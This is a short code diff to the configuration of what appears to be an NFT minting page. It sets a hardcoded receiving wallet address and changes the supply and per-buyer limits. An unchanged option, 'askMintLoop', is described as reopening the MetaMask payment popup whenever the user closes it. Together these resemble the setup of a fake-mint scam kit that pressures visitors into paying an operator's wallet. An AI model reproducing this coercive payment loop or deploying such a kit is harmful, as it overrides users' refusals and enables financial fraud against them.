@@ -1,10 +1,10 @@
-const address = "Your Wallet";
+const address = "BA6jKFonN2Yb9B4ur9xBeBkrVg4YpK4i58JtDZ6CmTk4";
 
 const mintInfo = {
     price: 0.2,         // Price per NFT.
-    totalSupply: 667,   // Total supply of NFTs.
+    totalSupply: 10000,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
-    maxUnits: 6,        // Max units to buy.
+    maxUnits: 5,        // Max units to buy.
     askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
 }
 
